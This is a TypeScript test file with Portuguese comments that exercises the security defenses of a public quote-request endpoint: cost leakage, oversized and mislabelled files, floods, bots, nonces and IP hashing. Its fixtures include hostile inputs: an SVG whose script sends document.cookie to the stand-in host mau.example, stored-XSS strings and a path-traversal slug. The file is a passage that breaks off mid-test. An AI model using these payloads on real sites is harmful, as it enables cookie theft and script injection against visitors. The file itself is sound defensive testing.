import multipart from '@fastify/multipart';
import { type FastifyInstance, fastify } from 'fastify';
import { beforeEach, describe, expect, it, vi } from 'vitest';

/**
 * LINK PÚBLICO DE ORÇAMENTO — os testes das DEFESAS.
 *
 * Cada linha da tabela de ameaças da F6 tem pelo menos um teste aqui, e todos
 * batem no controller de verdade, por HTTP de verdade, com o multipart
 * REGISTRADO EXATAMENTE COMO EM PRODUÇÃO (1,5 GB globais). É o único jeito de
 * provar que o override por request existe: se alguém apagar o `limits` do
 * `request.parts()`, o teste de arquivo gigante passa a devolver 200.
 *
 * O que é falso aqui é só a borda: banco, Redis, upvox e SMTP entram por
 * injeção (`PublicQuoteDeps`). O cálculo do preço é o motor REAL da F5.
 */

/* ───────────────── mocks das bordas que o bloco `quote.price` usa ───────────────── */

const repoList = vi.fn();
const repoNearest = vi.fn();
const repoFindById = vi.fn();

vi.mock('@/repositories/tool-collection.js', () => ({
	toolCollectionRepository: {
		list: (...a: unknown[]) => repoList(...a),
		nearest: (...a: unknown[]) => repoNearest(...a),
		findById: (...a: unknown[]) => repoFindById(...a),
	},
}));

/**
 * Nunca deve ser chamado no caminho público: não há Bearer do dono para falar
 * com o upvox por HTTP. Se for chamado, o `throw` abaixo quebra o teste.
 */
const loadPublished = vi.fn(() => {
	throw new Error('o link público não pode buscar a definition por HTTP');
});
vi.mock('@/lib/tool-definitions.js', () => ({
	loadPublishedToolDefinition: (...a: unknown[]) => loadPublished(...a),
}));

import {
	makePublicQuoteControllers,
	type PublicQuoteDeps,
} from '@/controllers/public-quote.js';
import { buildBox } from '@/lib/cad/generators/box.js';
import { sketchToDxf } from '@/lib/cad/render-dxf.js';
import { sketchToSvg } from '@/lib/cad/render-svg.js';
import { readSvg } from '@/lib/cad/svg-read.js';
import { hashIp, issueNonce, verifyNonce } from '@/lib/public-quote.js';
import type { CollectionEntry } from '@/repositories/tool-collection.js';

/* ────────────────────────────── fixtures ────────────────────────────── */

const OWNER = '11111111-1111-4111-8111-111111111111';
const SLUG = 'metalurgica-silva';

/** Sentinelas: valores que NÃO PODEM aparecer na resposta pública. */
const SENTINELA = {
	precoKg: 137.77,
	densidade: 0.7331,
	velocidade: 41.13,
	markup: 313,
	horaOperador: 99.71,
	perfilId: '22222222-2222-4222-8222-222222222222',
};

const SVG_QUADRADO = `<svg xmlns="http://www.w3.org/2000/svg" width="100mm" height="50mm" viewBox="0 0 100 50">
	<rect x="0" y="0" width="100" height="50"/>
</svg>`;

const SVG_HOSTIL = `<svg xmlns="http://www.w3.org/2000/svg" width="50mm" height="50mm" viewBox="0 0 50 50" onload="alert(1)">
	<script type="text/javascript">fetch('http://mau.example/'+document.cookie)</script>
	<foreignObject width="10" height="10"><body>roubado</body></foreignObject>
	<image href="http://mau.example/x.png" width="10" height="10"/>
	<use xlink:href="http://mau.example/x.svg#a"/>
	<title>&lt;script&gt;alert(2)&lt;/script&gt;</title>
	<rect x="0" y="0" width="50" height="50"/>
</svg>`;

const DXF_CAIXA = sketchToDxf(
	buildBox({
		dim_mode: 'externo',
		largura: 120,
		profundidade: 90,
		altura: 40,
		espessura: 3,
		material: 'MDF',
		tampa: 'encaixe',
		fundo: true,
	}),
);

/** SVG-bomba: mais elementos do que o teto agressivo desta rota (20k). */
function svgBomba(n: number): string {
	const linhas: string[] = [];
	for (let i = 0; i < n; i++) {
		linhas.push(`<rect x="${i % 200}" y="${i % 200}" width="1" height="1"/>`);
	}
	return `<svg xmlns="http://www.w3.org/2000/svg" width="200mm" height="200mm" viewBox="0 0 200 200">${linhas.join('')}</svg>`;
}

function linkEntry(over: Record<string, unknown> = {}): CollectionEntry {
	return {
		id: 'link-1',
		tool_key: 'central_custos',
		collection: 'links',
		title: 'Metalúrgica Silva',
		description: null,
		category: null,
		position: 0,
		active: true,
		status: 'approved',
		review_note: null,
		owner_id: OWNER,
		visibility: 'owner',
		score: null,
		stats: {},
		created_at: '2026-01-01T00:00:00Z',
		updated_at: '2026-01-01T00:00:00Z',
		example_before_url: null,
		example_after_url: null,
		data: {
			slug: SLUG,
			titulo: 'Orçamento na hora',
			logo_url: 'https://cdn.example/logo.png',
			cor: '#4f46e5',
			email: 'dono@example.com',
			perfil_id: SENTINELA.perfilId,
			materiais_permitidos: 'mdf|acrílico',
			espessuras_permitidas: '3|6|9',
			qtd_max: 100,
			pedir_lead: true,
			mostrar_prazo: true,
			teto_dia: 30,
			teto_mes: 300,
			ativo: true,
			...over,
		},
	};
}

function materialEntry(): CollectionEntry {
	return {
		...linkEntry(),
		id: 'mat-1',
		collection: 'materiais',
		title: 'MDF cru',
		visibility: 'public',
		data: {
			familia: 'mdf',
			densidade_g_cm3: SENTINELA.densidade,
			preco_kg: SENTINELA.precoKg,
			chapa_w_mm: 2750,
			chapa_h_mm: 1830,
			espessuras: '3|6|9|12',
			laser: 'co2',
		},
	};
}

/** Perfil de custo do dono — recheado de sentinelas que não podem vazar. */
function perfilEntry(): CollectionEntry {
	return {
		...linkEntry(),
		id: SENTINELA.perfilId,
		collection: 'perfis',
		title: 'Minha máquina',
		owner_id: OWNER,
		data: {
			laser: 'co2',
			potencia_w: 130,
			v_grav_mm_s: 300,
			line_mm: 0.1,
			custo_hora_operador: SENTINELA.horaOperador,
			markup_pct: SENTINELA.markup,
			imposto_pct: 6,
			pedido_minimo: 0,
			prazo_base_dias: 4,
			material_basis: 'bbox',
		},
	};
}

const DOC = {
	collections: {
		materiais: { fields: [{ name: 'familia', type: 'enum' }] },
		velocidades: {
			fields: [{ name: 'espessura_mm', type: 'number' }],
			nearest: { on: ['espessura_mm', 'potencia_w'], groupBy: ['material'] },
		},
		perfis: { fields: [] },
		links: { fields: [] },
		leads: { fields: [] },
	},
};

/* ───────────────────────── deps falsas (bordas) ───────────────────────── */

interface Espiao {
	deps: PublicQuoteDeps;
	cobrancas: unknown[];
	leads: Record<string, unknown>[];
	emails: unknown[];
	contadores: Map<string, number>;
	relogio: { agora: number };
	proximaCobranca: { modo: 'ok' | 'sem_saldo' | 'erro' };
	link: CollectionEntry;
}

function montaDeps(over: Partial<PublicQuoteDeps> = {}): Espiao {
	const contadores = new Map<string, number>();
	const cacheado = new Map<string, unknown>();
	const cobrancas: unknown[] = [];
	const leads: Record<string, unknown>[] = [];
	const emails: unknown[] = [];
	const relogio = { agora: 1_800_000_000_000 };
	const proximaCobranca: { modo: 'ok' | 'sem_saldo' | 'erro' } = { modo: 'ok' };
	const estado = { link: linkEntry() };

	const deps: PublicQuoteDeps = {
		findLink: async (slug) => (slug === SLUG ? estado.link : null),
		linkAtivo: (e) => e.active !== false && e.data?.ativo !== false,
		listMateriais: async () => [materialEntry()],
		loadToolDoc: async () => DOC,
		createLead: async (l) => {
			leads.push(l as unknown as Record<string, unknown>);
		},
		charge: async (input) => {
			cobrancas.push(input);
			if (proximaCobranca.modo === 'sem_saldo') {
				return {
					ok: false,
					semSaldo: true,
					status: 402,
					detalhe: 'insufficient_voxes',
				};
			}
			if (proximaCobranca.modo === 'erro') {
				return { ok: false, semSaldo: false, status: 503, detalhe: 'rede' };
			}
			return {
				ok: true,
				invocationId: '33333333-3333-4333-8333-333333333333',
				voxesSpent: 2,
				balance: 100,
				replayed: false,
			};
		},
		incr: async (key) => {
			const n = (contadores.get(key) ?? 0) + 1;
			contadores.set(key, n);
			return n;
		},
		cacheAside: async (key, _ttl, fn) => {
			if (cacheado.has(key)) return cacheado.get(key) as never;
			const v = await fn();
			cacheado.set(key, v);
			return v;
		},
		avisaDono: (e) => {
			emails.push(e);
		},
		agora: () => relogio.agora,
		...over,
	};

	return {
		deps,
		cobrancas,
		leads,
		emails,
		contadores,
		relogio,
		proximaCobranca,
		get link() {
			return estado.link;
		},
		set link(v: CollectionEntry) {
			estado.link = v;
		},
	} as Espiao;
}

/* ───────────────────────── app Fastify de verdade ───────────────────────── */

/**
 * O multipart é registrado com 1,5 GB — o MESMO valor de `src/server.ts`. É
 * essa igualdade que faz o teste de arquivo gigante valer alguma coisa: quem
 * segura os 8 MB é o override por request, dentro do controller.
 */
async function montaApp(deps: PublicQuoteDeps): Promise<FastifyInstance> {
	const app = fastify();
	await app.register(multipart, { limits: { fileSize: 1500 * 1024 * 1024 } });
	const c = makePublicQuoteControllers(deps);
	app.get('/api/public/quote/:slug', c.info);
	app.post('/api/public/quote/:slug/estimate', c.estimate);
	await app.ready();
	return app;
}

const BOUNDARY = '----vitestPublicQuote';

/** Monta um corpo multipart de verdade (é o busboy que vamos exercitar). */
function multipartBody(
	campos: Record<string, string>,
	arquivo?: { nome: string; conteudo: Buffer | string; mime?: string },
): Buffer {
	const partes: Buffer[] = [];
	for (const [k, v] of Object.entries(campos)) {
		partes.push(
			Buffer.from(
				`--${BOUNDARY}\r\nContent-Disposition: form-data; name="${k}"\r\n\r\n${v}\r\n`,
			),
		);
	}
	if (arquivo) {
		partes.push(
			Buffer.from(
				`--${BOUNDARY}\r\nContent-Disposition: form-data; name="arquivo"; filename="${arquivo.nome}"\r\n` +
					`Content-Type: ${arquivo.mime ?? 'application/octet-stream'}\r\n\r\n`,
			),
		);
		partes.push(
			Buffer.isBuffer(arquivo.conteudo)
				? arquivo.conteudo
				: Buffer.from(arquivo.conteudo, 'utf8'),
		);
		partes.push(Buffer.from('\r\n'));
	}
	partes.push(Buffer.from(`--${BOUNDARY}--\r\n`));
	return Buffer.concat(partes);
}

interface PostOpts {
	campos?: Record<string, string>;
	arquivo?: { nome: string; conteudo: Buffer | string; mime?: string };
	slug?: string;
	headers?: Record<string, string>;
}

async function postEstimate(app: FastifyInstance, opts: PostOpts = {}) {
	const slug = opts.slug ?? SLUG;
	return app.inject({
		method: 'POST',
		url: `/api/public/quote/${slug}/estimate`,
		headers: {
			'content-type': `multipart/form-data; boundary=${BOUNDARY}`,
			...(opts.headers ?? {}),
		},
		payload: multipartBody(opts.campos ?? {}, opts.arquivo),
	});
}

/** Campos de um pedido legítimo, com nonce válido e "envelhecido". */
function camposValidos(espiao: Espiao, over: Record<string, string> = {}) {
	const nonce = issueNonce(SLUG, espiao.relogio.agora);
	espiao.relogio.agora += 5_000; // passou dos 3 s mínimos
	return {
		nonce,
		material: 'mdf',
		espessura_mm: '3',
		qtd: '10',
		nome: 'Cliente Final',
		whatsapp: '11999998888',
		consentimento: 'true',
		...over,
	};
}

beforeEach(() => {
	repoList.mockReset();
	repoNearest.mockReset();
	repoFindById.mockReset();
	loadPublished.mockClear();

	// materiais: o bloco `quote.price` filtra por família e pega o primeiro.
	repoList.mockResolvedValue({
		items: [materialEntry()],
		total: 1,
		page: 1,
		pageSize: 1,
		pages: 1,
	});
	// sem base de velocidade curada: a cascata cai na curva do modelo.
	repoNearest.mockResolvedValue([]);
	repoFindById.mockResolvedValue(perfilEntry());
});

/* ══════════════════════════════ 1. GET ══════════════════════════════ */

describe('GET /api/public/quote/:slug', () => {
	it('devolve o cardápio, o nonce e NADA de custo/perfil/dono', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);

		const res = await app.inject({ url: `/api/public/quote/${SLUG}` });
		expect(res.statusCode).toBe(200);
		const body = res.json();

		expect(body.titulo).toBe('Orçamento na hora');
		expect(body.materiais).toEqual([
			{ id: 'mdf', nome: 'MDF cru', espessuras: [3, 6, 9] },
		]);
		expect(body.qtd_max).toBe(100);
		expect(body.mostrar_prazo).toBe(true);
		expect(body.campos_lead.map((c: { name: string }) => c.name)).toContain(
			'whatsapp',
		);
		expect(verifyNonce(SLUG, body.nonce, espiao.relogio.agora + 5000).ok).toBe(
			true,
		);

		// O contrato é a AUSÊNCIA: nem o dono, nem o perfil, nem os tetos.
		const cru = JSON.stringify(body);
		expect(cru).not.toContain(OWNER);
		expect(cru).not.toContain(SENTINELA.perfilId);
		expect(cru).not.toContain('teto');
		expect(cru).not.toContain(String(SENTINELA.precoKg));
		expect(cru).not.toContain(String(SENTINELA.densidade));

		await app.close();
	});

	it('link inexistente e link desligado devolvem o MESMO 404', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);

		const inexistente = await app.inject({
			url: '/api/public/quote/nao-existe',
		});
		espiao.link = linkEntry({ ativo: false });
		const desligado = await app.inject({ url: `/api/public/quote/${SLUG}` });

		expect(inexistente.statusCode).toBe(404);
		expect(desligado.statusCode).toBe(404);
		// Mesma resposta: a diferença contaria que o link EXISTE.
		expect(inexistente.json()).toEqual(desligado.json());
		await app.close();
	});

	it('nem o DONO injeta marcação na página do cliente final dele', async () => {
		// A página é servida no NOSSO domínio para visitantes que não são o dono.
		// Título com tag e logo com `javascript:` são XSS armazenado contra
		// terceiros — o dono controla o valor, mas não é ele quem lê.
		const espiao = montaDeps();
		espiao.link = linkEntry({
			titulo: '<img src=x onerror="alert(1)">Silva',
			logo_url: 'javascript:alert(document.cookie)',
			cor: '"><script>alert(1)</script>',
		});
		const app = await montaApp(espiao.deps);
		const res = await app.inject({ url: `/api/public/quote/${SLUG}` });
		const body = res.json();

		expect(body.titulo).toBe('img src=x onerror=alert(1)Silva');
		expect(body.logo_url).toBe('');
		expect(res.payload).not.toContain('<script');
		expect(res.payload).not.toContain('javascript:');
		await app.close();
	});

	it('slug fora do formato não chega ao banco', async () => {
		const findLink = vi.fn(async () => null);
		const espiao = montaDeps({ findLink });
		const app = await montaApp(espiao.deps);
		const res = await app.inject({
			url: '/api/public/quote/..%2F..%2Fetc%2Fpasswd',
		});
		expect(res.statusCode).toBe(404);
		expect(findLink).not.toHaveBeenCalled();
		await app.close();
	});
});

/* ══════════════════════ 2. Caminho feliz + vazamento ══════════════════════ */

describe('POST estimate — caminho feliz', () => {
	it('devolve preço, dimensões e peças, e cobra o DONO uma vez', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);

		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});

		expect(res.statusCode).toBe(200);
		const body = res.json();
		expect(body.price_total_cents).toBeGreaterThan(0);
		expect(body.qtd).toBe(10);
		expect(body.dims_mm).toEqual({ largura: 100, altura: 50 });
		expect(body.pecas).toBe(1);
		expect(body.prazo_dias).toBeGreaterThan(0);

		// Cobrou o dono, com a tool certa — e NUNCA o visitante.
		expect(espiao.cobrancas).toHaveLength(1);
		expect(espiao.cobrancas[0]).toMatchObject({
			customerId: OWNER,
			toolKey: 'central_custos',
		});
		// E não precisou do upvox por HTTP para carregar a definition.
		expect(loadPublished).not.toHaveBeenCalled();
		await app.close();
	});

	it('DXF real também é aceito', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao, { qtd: '1' }),
			arquivo: { nome: 'caixa.dxf', conteudo: DXF_CAIXA },
		});
		expect(res.statusCode).toBe(200);
		expect(res.json().price_total_cents).toBeGreaterThan(0);
		await app.close();
	});

	it('VAZAMENTO DE CUSTO: o JSON público inteiro está limpo', async () => {
		// Este é o teste que protege o profissional do cliente final dele. Ele
		// varre CHAVES e VALORES: chave nova de custo no `breakdown` não vaza
		// porque a resposta é montada do zero, e valor de custo não vaza porque
		// as sentinelas do material e do perfil são procuradas no JSON cru.
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(200);
		const body = res.json();

		const proibido =
			/custo|markup|margem|taxa|imposto|overhead|hora|kwh|maquina|máquina|setup|kg|m2|densidade|velocidade|perfil|confian|breakdown|owner|invocation|vox/i;
		const chaves: string[] = [];
		const anda = (v: unknown, path = '') => {
			if (v && typeof v === 'object') {
				for (const [k, val] of Object.entries(v)) {
					const p = path ? `${path}.${k}` : k;
					if (!Array.isArray(v)) chaves.push(p);
					anda(val, p);
				}
			}
		};
		anda(body);
		expect(chaves.filter((k) => proibido.test(k))).toEqual([]);

		const cru = JSON.stringify(body);
		for (const [nome, valor] of Object.entries(SENTINELA)) {
			expect(cru, `sentinela ${nome} vazou`).not.toContain(String(valor));
		}
		expect(cru).not.toContain(OWNER);
		// `avisos` só carrega diagnóstico do ARQUIVO do cliente.
		for (const aviso of body.avisos as string[]) {
			expect(aviso).not.toMatch(/R\$|custo|markup|perfil de custo/i);
		}
		await app.close();
	});
});

/* ══════════════════════════ 3. Arquivo gigante ══════════════════════════ */

describe('defesa: arquivo gigante', () => {
	it('9 MB → 413 mesmo com o multipart global em 1,5 GB', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);

		// DXF "válido" no começo e 9 MB de recheio: o corte tem que vir do
		// LIMITE, não do parser.
		const gordo = Buffer.concat([
			Buffer.from('  0\r\nSECTION\r\n  2\r\nENTITIES\r\n'),
			Buffer.alloc(9 * 1024 * 1024, 0x41),
		]);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'bomba.dxf', conteudo: gordo },
		});

		expect(res.statusCode).toBe(413);
		expect(espiao.cobrancas).toHaveLength(0);
		await app.close();
	});

	it('dois arquivos no mesmo pedido → 413 (limite de 1 arquivo)', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const corpo = Buffer.concat([
			multipartBody(camposValidos(espiao), {
				nome: 'a.svg',
				conteudo: SVG_QUADRADO,
			}).subarray(0, -Buffer.from(`--${BOUNDARY}--\r\n`).length),
			Buffer.from(
				`--${BOUNDARY}\r\nContent-Disposition: form-data; name="arquivo2"; filename="b.svg"\r\nContent-Type: image/svg+xml\r\n\r\n${SVG_QUADRADO}\r\n--${BOUNDARY}--\r\n`,
			),
		]);
		const res = await app.inject({
			method: 'POST',
			url: `/api/public/quote/${SLUG}/estimate`,
			headers: {
				'content-type': `multipart/form-data; boundary=${BOUNDARY}`,
			},
			payload: corpo,
		});
		expect(res.statusCode).toBe(413);
		expect(espiao.cobrancas).toHaveLength(0);
		await app.close();
	});
});

/* ═══════════════════════════ 4. Tipo falso ═══════════════════════════ */

describe('defesa: tipo de arquivo mentiroso', () => {
	it('PNG renomeado para .dxf → 415 (o CONTEÚDO manda)', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			// mimetype de imagem também mente — e é IGNORADO.
			arquivo: { nome: 'peca.dxf', conteudo: png, mime: 'image/vnd.dxf' },
		});
		expect(res.statusCode).toBe(415);
		expect(espiao.cobrancas).toHaveLength(0);
		await app.close();
	});

	it('extensão proibida → 415 antes de qualquer leitura', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: {
				nome: 'peca.svg.exe',
				conteudo: SVG_QUADRADO,
				mime: 'image/svg+xml',
			},
		});
		expect(res.statusCode).toBe(415);
		await app.close();
	});

	it('DXF disfarçado de .svg → 415 (extensão e conteúdo têm que casar)', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'truque.svg', conteudo: DXF_CAIXA },
		});
		expect(res.statusCode).toBe(415);
		await app.close();
	});
});

/* ═══════════════════════════ 5. SVG malicioso ═══════════════════════════ */

describe('defesa: SVG hostil', () => {
	it('orça normalmente e NADA de executável sai na resposta', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao, { qtd: '1' }),
			arquivo: { nome: 'hostil.svg', conteudo: SVG_HOSTIL },
		});

		expect(res.statusCode).toBe(200);
		const cru = res.payload;
		for (const veneno of [
			'mau.example',
			'<script',
			'</',
			'alert(',
			'onerror',
			'document.cookie',
			'href',
		]) {
			expect(cru, `vazou '${veneno}'`).not.toContain(veneno);
		}

		// O diagnóstico CONTA ao visitante o que foi ignorado no arquivo DELE —
		// isso é útil e fica. O que não pode é vir com marcação: nenhum caractere
		// com que se monte HTML sobrevive em nenhum aviso.
		for (const aviso of res.json().avisos as string[]) {
			expect(aviso).not.toMatch(/[<>"'`\\]/);
		}
		await app.close();
	});

	it('nome de tag exótico chega inerte ao aviso público', async () => {
		// O nome da tag é escolhido por quem sobe o arquivo (`RE_TAG` aceita
		// `[A-Za-z_][\w:.-]*`) e é ecoado no diagnóstico. Sem higienização, era
		// texto de terceiro anônimo dentro da página do cliente de outra pessoa.
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="20mm" height="20mm" viewBox="0 0 20 20">
			<clique.aqui:agora-0800 />
			<rect x="0" y="0" width="20" height="20"/>
		</svg>`;
		const res = await postEstimate(app, {
			campos: camposValidos(espiao, { qtd: '1' }),
			arquivo: { nome: 'exotico.svg', conteudo: svg },
		});
		expect(res.statusCode).toBe(200);
		const avisos = (res.json().avisos as string[]).join(' ');
		expect(avisos).not.toMatch(/[<>"'`\\]/);
		await app.close();
	});

	it('o PREVIEW re-serializado a partir da IR também sai limpo', async () => {
		// A rota pública não devolve preview, mas o desenho hostil passa pelo
		// mesmo leitor; este teste prova que, se alguém publicar o preview
		// amanhã, o que sai é geometria re-serializada e não o arquivo do
		// visitante.
		const preview = sketchToSvg(readSvg(SVG_HOSTIL));
		for (const veneno of [
			'mau.example',
			'<script',
			'alert(',
			'onload',
			'foreignObject',
			'<use',
			'<image',
		]) {
			expect(preview, `preview vazou '${veneno}'`).not.toContain(veneno);
		}
	});
});

/* ═════════════════════════ 6. Bomba de expansão ═════════════════════════ */

describe('defesa: bomba de expansão', () => {
	it('SVG com 25k elementos → 413 no cliente (não 500)', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'bomba.svg', conteudo: svgBomba(25_000) },
		});
		expect(res.statusCode).toBe(413);
		expect(res.json().message).toBe('arquivo_grande_demais');
		expect(espiao.cobrancas).toHaveLength(0);
		await app.close();
	});
});

/* ═══════════════════════════ 7. Flood ═══════════════════════════ */

describe('defesa: flood', () => {
	it('7ª tentativa do mesmo IP na mesma hora → 429', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);

		const status: number[] = [];
		for (let i = 0; i < 7; i++) {
			const res = await postEstimate(app, {
				campos: camposValidos(espiao, { qtd: String(i + 1) }),
				arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
			});
			status.push(res.statusCode);
		}
		expect(status.slice(0, 6).every((s) => s === 200)).toBe(true);
		expect(status[6]).toBe(429);
		expect(espiao.cobrancas).toHaveLength(6);
		await app.close();
	});

	it('teto do LINK estourado → 429 e nada é cobrado', async () => {
		const espiao = montaDeps();
		espiao.link = linkEntry({ teto_dia: 2 });
		const app = await montaApp(espiao.deps);

		const status: number[] = [];
		for (let i = 0; i < 3; i++) {
			const res = await postEstimate(app, {
				campos: camposValidos(espiao, { qtd: String(i + 1) }),
				arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
			});
			status.push(res.statusCode);
		}
		expect(status).toEqual([200, 200, 429]);
		expect(espiao.cobrancas).toHaveLength(2);
		await app.close();
	});

	it('pedido que nem vira preço NÃO queima a cota do dono', async () => {
		// O teto por link é incrementado só na hora de cobrar. Um arquivo
		// inválido não pode consumir os 30 orçamentos do dia do profissional.
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.dxf', conteudo: Buffer.from([0x89, 0x50]) },
		});
		expect(
			[...espiao.contadores.keys()].some((k) => k.startsWith('q:slug:')),
		).toBe(false);
		await app.close();
	});

	it('flood de arquivos GRANDES também é barrado pelo teto por IP', async () => {
		// O teto por IP é conferido ANTES de ler o corpo. Sem isso, um atacante
		// mandaria 8 MB por requisição para sempre, variando um campo inválido:
		// cada tentativa é rejeitada de graça em CPU, mas já consumiu banda.
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const gordo = Buffer.concat([
			Buffer.from('  0\r\nSECTION\r\n'),
			Buffer.alloc(9 * 1024 * 1024, 0x41),
		]);

		const status: number[] = [];
		for (let i = 0; i < 7; i++) {
			const res = await postEstimate(app, {
				campos: camposValidos(espiao),
				arquivo: { nome: 'bomba.dxf', conteudo: gordo },
			});
			status.push(res.statusCode);
		}
		expect(status.slice(0, 6)).toEqual([413, 413, 413, 413, 413, 413]);
		expect(status[6]).toBe(429);
		await app.close();
	});

	it('sem Redis (incr = -1) o orçamento continua funcionando', async () => {
		const espiao = montaDeps({ incr: async () => -1 });
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(200);
		await app.close();
	});
});

/* ═══════════════════════════ 8. Bot ═══════════════════════════ */

describe('defesa: bot', () => {
	it('honeypot preenchido → 200 vazio e NADA cobrado', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao, { website: 'http://spam.example' }),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(200);
		expect(res.json()).toEqual({});
		expect(espiao.cobrancas).toHaveLength(0);
		expect(espiao.leads).toHaveLength(0);
		await app.close();
	});

	it('nonce ausente → 400 e nada cobrado', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const campos = camposValidos(espiao);
		delete (campos as Record<string, string>).nonce;
		const res = await postEstimate(app, {
			campos,
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		expect(res.json().message).toBe('sessao_expirada');
		expect(espiao.cobrancas).toHaveLength(0);
		await app.close();
	});

	it('nonce expirado (31 min) → 400', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const nonce = issueNonce(SLUG, espiao.relogio.agora);
		espiao.relogio.agora += 31 * 60 * 1000;
		const res = await postEstimate(app, {
			campos: { ...camposValidos(espiao), nonce },
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		await app.close();
	});

	it('POST em menos de 3 s depois do GET → 400', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const nonce = issueNonce(SLUG, espiao.relogio.agora);
		espiao.relogio.agora += 900; // robô: 0,9 s
		const res = await postEstimate(app, {
			campos: {
				nonce,
				material: 'mdf',
				espessura_mm: '3',
				qtd: '1',
			},
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		expect(espiao.cobrancas).toHaveLength(0);
		await app.close();
	});

	it('nonce de OUTRO link não vale neste (assinatura casa com o slug)', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const nonce = issueNonce('outro-link', espiao.relogio.agora);
		espiao.relogio.agora += 5_000;
		const res = await postEstimate(app, {
			campos: { ...camposValidos(espiao), nonce },
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		await app.close();
	});

	it('nonce adulterado (timestamp trocado) não passa', async () => {
		const espiao = montaDeps();
		const nonce = issueNonce(SLUG, espiao.relogio.agora);
		const [, aleatorio, sig] = nonce.split('.');
		const forjado = `${espiao.relogio.agora - 60_000}.${aleatorio}.${sig}`;
		expect(
			verifyNonce(SLUG, forjado, espiao.relogio.agora + 5_000),
		).toMatchObject({ ok: false, motivo: 'assinatura' });
	});
});

/* ═══════════════════════ 9. IP e LGPD ═══════════════════════ */

describe('defesa: IP', () => {
	it('o lead guarda o HASH, nunca o IP', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(espiao.leads).toHaveLength(1);
		const lead = espiao.leads[0];
		expect(String(lead.ipHash)).toMatch(/^[0-9a-f]{64}$/);
		expect(String(lead.ipHash)).not.toContain('127.0.0.1');
		// E o nome do arquivo entra higienizado.
		expect(lead.arquivoNome).toBe('peca.svg');
		await app.close();
	});

	it('x-forwarded-for forjado não muda a chave de teto (sem trustProxy)', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		for (let i = 0; i < 7; i++) {
			await postEstimate(app, {
				campos: camposValidos(espiao, { qtd: String(i + 1) }),
				arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
				// IP diferente a cada tentativa: se o header fosse confiado, o teto
				// por IP nunca seria alcançado.
				headers: { 'x-forwarded-for': `203.0.113.${i}` },
			});
		}
		const chavesIp = [...espiao.contadores.keys()].filter((k) =>
			k.startsWith('q:ip:'),
		);
		// Um único hash de IP, apesar dos 7 headers diferentes.
		expect(new Set(chavesIp.map((k) => k.split(':')[2])).size).toBe(1);
		expect(espiao.cobrancas).toHaveLength(6);
		await app.close();
	});

	it('hashIp é estável e não é o IP', () => {
		expect(hashIp('203.0.113.7')).toBe(hashIp('203.0.113.7'));
		expect(hashIp('203.0.113.7')).not.toBe(hashIp('203.0.113.8'));
		expect(hashIp('203.0.113.7')).not.toContain('203');
	});
});

/* ═══════════════════ 10. Quem paga: 402 e idempotência ═══════════════════ */

describe('cobrança do dono', () => {
	it('402 do upvox → mensagem NEUTRA + e-mail ao dono', async () => {
		const espiao = montaDeps();
		espiao.proximaCobranca.modo = 'sem_saldo';
		const app = await montaApp(espiao.deps);

		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
